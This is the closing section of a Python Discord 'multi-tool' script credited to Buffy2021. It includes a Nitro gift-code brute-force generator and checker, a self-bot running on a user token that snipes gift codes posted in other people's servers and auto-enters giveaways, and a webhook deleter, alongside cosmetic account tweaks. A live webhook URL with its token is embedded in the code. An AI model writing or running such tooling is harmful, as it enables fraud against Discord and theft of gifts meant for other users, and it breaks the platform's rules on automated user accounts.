                webhook = url if url != "https://discord.com/api/webhooks/990439330851995658/E2cDAFw-b55aEL7-jS-IMFcLWBVAgP2ehf93fdqpwlVx65e62W7gikomP3Cvp0kAWqVr" else None 
                valid = [] 
                invalid = 0 

                for i in range(num): 
                    try: 
                        code = "".join(random.choices(
                            string.ascii_uppercase + string.digits + string.ascii_lowercase,
                            k = 16
                        ))
                        url = f"https://discord.gift/{code}"

                        result = self.quickChecker(url, webhook)

                        if result:
                            valid.append(url)
                        else:
                            invalid += 1
                    except Exception as e:
                        print(f"\t\t[!] Error : {url}")


                print(f"""
        \t[+] Results:
                  \t   [!] Valid: {len(valid)}
                  \t   [!] Invalid: {invalid}
                  \t   [!] Valid Codes: {', '.join(valid )}\n""")

                main()

            def generator(self, amount):
                with open(self.fileName, "w", encoding="utf-8") as file:
                    print(f"\t[#] Wait, Generating for you")

                    start = time.time()

                    for i in range(amount):
                        code = "".join(random.choices(
                            string.ascii_uppercase + string.digits + string.ascii_lowercase,
                            k = 16
                        ))

                        file.write(f"https://discord.gift/{code}\n")

                    print(f"\tGenned {amount} codes | Time taken: {round(time.time() - start, 5)}s\n") #

            def fileChecker(self, notify = None):
                valid = []
                invalid = 0
                with open(self.fileName, "r", encoding="utf-8") as file:
                    for line in file.readlines():
                        nitro = line.strip("\n")

                        url = f"https://discordapp.com/api/v9/entitlements/gift-codes/{nitro}?with_application=false&with_subscription_plan=true"

                        response = requests.get(url)

                        if response.status_code == 200:
                            print(f"\t\t[!] VALID NITRO: {nitro}")
                            valid.append(nitro)

                            if notify is not None:
                                DiscordWebhook(
                                    url = notify,
                                    content = f"@everyone | A valid Nitro has been found => {nitro}"
                                ).execute()
                            else:
                                break
                        else:
                            print(f"\t\t[!] INVALID NITRO: {nitro}")
                            invalid += 1

                return {"valid" : valid, "invalid" : invalid}

            def quickChecker(self, nitro, notify = None):
            
                url = f"https://discordapp.com/api/v9/entitlements/gift-codes/{nitro}?with_application=false&with_subscription_plan=true"
                response = requests.get(url)

                if response.status_code == 200:
                    print(f"\t\t[!] VALID NITRO: {nitro}", flush=True)
                    with open("NitroCodes.txt", "w") as file:
                        file.write(nitro)

                    if notify is not None:
                        DiscordWebhook(
                            url = notify,
                            content = f"@everyone | A valid Nitro has been found => {nitro}"
                        ).execute()

                    return True

                else:
                    print(f"\t\t[!] INVALID NITRO: {nitro}", flush=True)
                    return False

        Gen = NitroGen()
        Gen.main()
    elif choice == "nsniper":
        data = {}
        bot = commands.Bot(command_prefix=".", self_bot=True)
        global ready
        ready = False
        codeRegex = re.compile("(discord.com/gifts/|discordapp.com/gifts/|discord.gift/)([a-zA-Z0-9]+)")

        while 1:
            try:
                @bot.event
                async def on_message(ctx):
                    global ready
                    if not ready:
                        print(f"""\t[#] Sniping Discord Nitro and Giveaway on {str(len(bot.guilds))} Servers""")
                        print("\t[#] Bot is ready\n")
                        ready = True
                    if codeRegex.search(ctx.content):
                        code = codeRegex.search(ctx.content).group(2)
                        start_time = time.time()
                        if len(code) < 16:
                            try:
                                print(f"""\t\t[#] Auto-detected a fake code: {code} From {ctx.author.name}#{ctx.author.discriminator} [{ctx.guild.name}>{ctx.channel.name}]""")
                            except:
                                print(f"""\t\t[#] Auto-detected a fake code: {code} From {ctx.author.name}#{ctx.author.discriminator}""")

                        else:
                            async with httpx.AsyncClient() as client:
                                result = await client.post('https://discordapp.com/api/v6/entitlements/gift-codes/' + code + '/redeem',json={'channel_id': str(ctx.channel.id)},headers={'authorization': usertoken, 'user-agent': 'Mozilla/5.0'})
                                delay = (time.time() - start_time)
                                try:
                                    print(f"""\t\t[#] Sniped code: {code} From {ctx.author.name}#{ctx.author.discriminator} [{ctx.guild.name}>{ctx.channel.name}]""")
                                except:
                                    print(f"""\t\t[#] Sniped code: {code} From {ctx.author.name}#{ctx.author.discriminator}""")

                            if 'This gift has been redeemed already' in str(result.content):
                                print("\t\t[#] Code has been already redeemed", end='')
                            elif 'nitro' in str(result.content):
                                print("\t\t[#] Code applied", end='')
                            elif 'Unknown Gift Code' in str(result.content):
                                print("\t\t[#] Invalid Code", end='')
                            print(" Delay:" + " %.3fs" % delay)
                    elif (('**giveaway**' in str(ctx.content).lower() or ('react with' in str(ctx.content).lower() and 'giveaway' in str(ctx.content).lower()))):
                        try:
                            await asyncio.sleep(randint(100, 200))
                            await ctx.add_reaction("🎉")
                            print(f"""\t[#] Enter Giveaway [{ctx.guild.name}>{ctx.channel.name}]""")
                        except:
                            print(f"""\t[#] Failed to enter Giveaway [{ctx.guild.name}>{ctx.channel.name}]""")
                    elif '<@' + str(bot.user.id) + '>' in ctx.content and ('giveaway' in str(ctx.content).lower() or 'won' in ctx.content or 'winner' in str(ctx.content).lower()):
                        try:
                            won = re.search("\t[#]You won the \*\*(.*)\*\*", ctx.content).group(1)
                        except:
                            won = "UNKNOWN"
                        print(f"""[#] Congratulations! You won Giveaway: {won} [{ctx.guild.name}>{ctx.channel.name}]""")

                bot.run(usertoken, bot=False)
            except:
                print(f"""\t[!] Error\n""")
                main()
    elif choice == "cleardm":
        prefix = "!"
        bot = commands.Bot(command_prefix=prefix, self_bot=True)
        bot.remove_command("help")
        print(f"""\t[#] Write "!clear" in one of your DMs to delete your messages\n""")

        @bot.command()
        async def clear(ctx, limit: int=None):
            passed = 0
            failed = 0
            async for msg in ctx.message.channel.history(limit=limit):
                if msg.author.id == bot.user.id:
                    try:
                        await msg.delete()
                        passed += 1
                    except:
                        failed += 1
            print(f"\t[!] Removed {passed} messages with {failed} fails\n")
            main()

        bot.run(usertoken, bot=False)
    elif choice == "housechanger":
        house = str(input(f"""\t[#] Which house do you want to be part of: \n\t\t[01] Bravery\n\t\t[02] Brilliance\n\t\t[03] Balance\n\t[+] Enter your House choice: """))
        if house == "1" or house == "01":
            payload = {'house_id': 1}
        elif house == "2" or house == "02":
            payload = {'house_id': 2}
        elif house == "3" or house == "03":
            payload = {'house_id': 3}
        else:
            print(f"""\t\t[!] Invalid Choice""")
            main()
        r = requests.post('https://discordapp.com/api/v6/hypesquad/online', headers=getheaders(usertoken), json=payload, timeout=10)
        if r.status_code == 204:
            print(f""" \t[!] Hypesquad House changed\n""")
            main()
        else:
            print(f"\t[!] Error occured while trying to change the HypeSquad house\n")
            main()
    elif choice == "schanger":
        status = input(f"""\t[#] Choose Custom Status: """)
        CustomStatus = {"custom_status": {"text": status}}
        try:
            r = requests.patch("https://discord.com/api/v9/users/@me/settings", headers=getheaders(usertoken), json=CustomStatus)
            print(f"""\t[!] Status changed to "{status}"\n""")
            main()
        except Exception as e:
            print(f"\t[!] Error: {e} Occured while trying to change the status\n")
    elif choice == "cycle":
        amount = int(input(f"""\t[+] Enter number of cycles: """))
        modes = cycle(["light", "dark"])
        for i in range(amount):
            print(f"""\t\t[{i+1}] Theme Color has been changed""")
            time.sleep(0.12)
            setting = {'theme': next(modes)}
            requests.patch("https://discord.com/api/v8/users/@me/settings", headers=getheaders(usertoken), json=setting)
        print(f"""\t[#] Cycle completed\n""")
        main()
    elif choice == "wremover":
        try:
            webhook = input(f"""\t[+] WebHook Link to Delete: """)
            requests.delete(webhook.rstrip())
            print(f"""\t[!] Webhook has been deleted\n""")
            main()
        except:
            print(f"""\t[!] Webhook could not be deleted\n""")
            main()

    elif choice == "color":
        print(f"""\n\tCode Color\tColor Name\n\t----------\t----------\n\tcolor g\t\tGreen\n\tcolor b\t\tBlue\n\tcolor r\t\tRed\n\tcolor p\t\tPurple\n\tcolor y\t\tYellow\n\tcolor w\t\tWhite\n""")
        main()
    elif choice == "color g":
        os.system('color a')
        print()
        main()
    elif choice == "color b":
        os.system('color b')
        print()
        main()
    elif choice == "color r":
        os.system('color c')
        print()
        main()
    elif choice == "color p":
        os.system('color d')
        print()
        main()
    elif choice == "color y":
        os.system('color e')
        print()
        main()
    elif choice == "color w":
        os.system('color f')
        print()
        main()

    elif choice == "reset":
        reset()
        main()
    elif choice == "help":
        print(f"""\n\tCommand\t\tDescription\n\t-------\t\t------------\n\ttools\t\tList the different tools\n\tcolor\t\tChange color theme\n\treset\t\tReset the page\n\thelp\t\tShow help menu\n\texit\t\tClose Rage\n""")
        main()
    elif choice == "exit":
        sys.exit()
    else:
        print(f"""\tInvalid command\n\tWrite "help" to see the available commands\n""")
        main()

def getheaders(token=None, content_type="application/json"):
    headers = {
        "Content-Type": content_type,
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11"
    }
    if token:
        headers.update({"Authorization": token})
    return headers

title()
login()


""" 

Made By Buffy2021#0001

https://discord.gg/4eFHVxz9qX

https://discord.gg/2stGN7gpRw

https://discord.gg/7VyVQ5qsZZ

"""
